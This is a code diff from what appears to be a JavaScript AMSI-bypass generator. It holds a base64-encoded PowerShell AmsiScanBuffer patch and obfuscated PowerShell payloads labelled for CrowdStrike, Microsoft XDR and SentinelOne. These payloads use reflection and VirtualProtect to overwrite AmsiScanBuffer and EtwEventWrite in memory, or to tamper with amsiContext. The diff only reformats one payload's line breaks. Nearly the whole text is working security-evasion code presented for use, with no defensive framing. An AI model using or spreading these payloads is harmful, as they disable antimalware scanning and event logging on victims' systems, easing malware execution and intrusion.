@@ -24,38 +24,38 @@ function getPayload(edr) {
     const RastaBuf = atob("I1Jhc3RhLW1vdXNlcyBBbXNpLVNjYW4tQnVmZmVyIHBhdGNoIFxuDQokV2luMzIgPSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KcHVibGljIGNsYXNzIFdpbjMyIHsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7DQogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnRQdHIgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOw0KfQ0KIkANCg0KQWRkLVR5cGUgJFdpbjMyDQoNCiRMaWJMb2FkID0gW1dpbjMyXTo6TG9hZExpYnJhcnkoImFtc2kuZGxsIikNCiRNZW1BZHIgPSBbV2luMzJdOjpHZXRQcm9jQWRkcmVzcygkTGliTG9hZCwgIkFtc2lTY2FuQnVmZmVyIikNCiRwID0gMA0KW1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJE1lbUFkciwgW3VpbnQzMl01LCAweDQwLCBbcmVmXSRwKQ0KJHZhcjEgPSAiMHhCOCINCiR2YXIyID0gIjB4NTciDQokdmFyMyA9ICIweDAwIg0KJHZhcjQgPSAiMHgwNyINCiR2YXI1ID0gIjB4ODAiDQokdmFyNiA9ICIweEMzIg0KJFBhdGNoID0gW0J5dGVbXV0gKCR2YXIxLCR2YXIyLCR2YXIzLCR2YXI0LCskdmFyNSwrJHZhcjYpDQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQYXRjaCwgMCwgJE1lbUFkciwgNik=");
 
     // EDR-specific payloads (placeholders)
-    const crowdStrikePayload = `#CrowdStrike AMSI Bypass\n$asm = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.EndsWith(('Sys' + 'tem.dll')) }
-$typ = $asm.GetType(('Micro' + 'soft.Win' + '32.Unsafe' + 'NativeMethods'))
-$mth = $typ.GetMethods() | Where-Object { $_.Name -cmatch ('^Ge' + '.*P.*oc.*' + 'ddress$') }
-$mod = $typ.GetMethod(('Get' + 'Module' + 'Handle'))
-$amh = $mod.Invoke($null, @(('am' + 'si.d' + 'll')))
-$p = $mth[0].Invoke($null, @($amh, ('Ams' + 'iScan' + 'Buffer')))
-$ab = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName(('Ref' + 'lected' + 'Delegate'))), [Reflection.Emit.AssemblyBuilderAccess]::Run)
-$mb = $ab.DefineDynamicModule(('InMem' + 'oryMod' + 'ule'), $false)
-$pt = @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType())
-$rt = [Bool]
-$tb = $mb.DefineType(('MyDel' + 'egate' + 'Type'), ('Class' + ',Public,Sealed,AnsiClass,AutoClass'), [MulticastDelegate])
-$cb = $tb.DefineConstructor(('RTSpe' + 'cialName,HideBySig,Public'), [Reflection.CallingConventions]::Standard, $pt)
-$cb.SetImplementationFlags(('Run' + 'time,Managed'))
-$dm = $tb.DefineMethod(('Invo' + 'ke'), ('Public,Hide' + 'BySig,NewSlot,Virtual'), $rt, $pt)
-$dm.SetImplementationFlags(('Run' + 'time,Managed'))
-$dt = $tb.CreateType()
-$vpm = $mod.Invoke($null, @(('kern' + 'el32.d' + 'll')))
-$vpp = $mth[0].Invoke($null, @($vpm, ('Virt' + 'ualPro' + 'tect')))
-$v = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpp, $dt)
-$o = 0
-$pr = $v.Invoke($p, 3, 0x40, [ref]$o)
+    const crowdStrikePayload = `#CrowdStrike AMSI Bypass\n$asm = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.EndsWith(('Sys' + 'tem.dll')) }\n
+$typ = $asm.GetType(('Micro' + 'soft.Win' + '32.Unsafe' + 'NativeMethods'))\n
+$mth = $typ.GetMethods() | Where-Object { $_.Name -cmatch ('^Ge' + '.*P.*oc.*' + 'ddress$') }\n
+$mod = $typ.GetMethod(('Get' + 'Module' + 'Handle'))\n
+$amh = $mod.Invoke($null, @(('am' + 'si.d' + 'll')))\n
+$p = $mth[0].Invoke($null, @($amh, ('Ams' + 'iScan' + 'Buffer')))\n
+$ab = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName(('Ref' + 'lected' + 'Delegate'))), [Reflection.Emit.AssemblyBuilderAccess]::Run)\n
+$mb = $ab.DefineDynamicModule(('InMem' + 'oryMod' + 'ule'), $false)\n
+$pt = @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType())\n
+$rt = [Bool]\n
+$tb = $mb.DefineType(('MyDel' + 'egate' + 'Type'), ('Class' + ',Public,Sealed,AnsiClass,AutoClass'), [MulticastDelegate])\n
+$cb = $tb.DefineConstructor(('RTSpe' + 'cialName,HideBySig,Public'), [Reflection.CallingConventions]::Standard, $pt)\n
+$cb.SetImplementationFlags(('Run' + 'time,Managed'))\n
+$dm = $tb.DefineMethod(('Invo' + 'ke'), ('Public,Hide' + 'BySig,NewSlot,Virtual'), $rt, $pt)\n
+$dm.SetImplementationFlags(('Run' + 'time,Managed'))\n
+$dt = $tb.CreateType()\n
+$vpm = $mod.Invoke($null, @(('kern' + 'el32.d' + 'll')))\n
+$vpp = $mth[0].Invoke($null, @($vpm, ('Virt' + 'ualPro' + 'tect')))\n
+$v = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpp, $dt)\n
+$o = 0\n
+$pr = $v.Invoke($p, 3, 0x40, [ref]$o)\n
 Start-Sleep 1
-[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8, 0x00, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3), 0, $p, 12)
-$emh = $mod.Invoke($null, @(('nt' + 'dll.d' + 'll')))
-$e = $mth[0].Invoke($null, @($emh, ('Etw' + 'Event' + 'Write')))
-$o = 0
-$pr = $v.Invoke($e, 3, 0x40, [ref]$o)
-$s = [Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
-if ($s -eq 8) {
-    [Runtime.InteropServices.Marshal]::WriteByte($e, 0xC3)
-} else {
-    [Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8, 0xff, 0x55), 0, $e, 3)
+[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8, 0x00, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3), 0, $p, 12)\n
+$emh = $mod.Invoke($null, @(('nt' + 'dll.d' + 'll')))\n
+$e = $mth[0].Invoke($null, @($emh, ('Etw' + 'Event' + 'Write')))\n
+$o = 0\n
+$pr = $v.Invoke($e, 3, 0x40, [ref]$o)\n
+$s = [Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])\n
+if ($s -eq 8) {\n
+    [Runtime.InteropServices.Marshal]::WriteByte($e, 0xC3)\n
+} else {\n
+    [Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8, 0xff, 0x55), 0, $e, 3)\n
 }`;
     const microsoftXDRPayload = `#MicrosoftXDR AMSI Bypass (Placeholder) \n$${memvar}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext", "NonPublic,Static").SetValue($null, [IntPtr]$${memvar});`;
     const sentinelOnePayload = `#SentinelOne AMSI Bypass (Placeholder) \n$${memvar}="System.Management.Automation.AmsiUtils";[Runtime.InteropServices.Marshal]::("WriteInt32")([Ref].Assembly.GetType($${memvar}).GetField("amsiContext",[Reflection.BindingFlags]"NonPublic,Static").GetValue($null),0x${randomInt(2147483647).toString(16)});`;
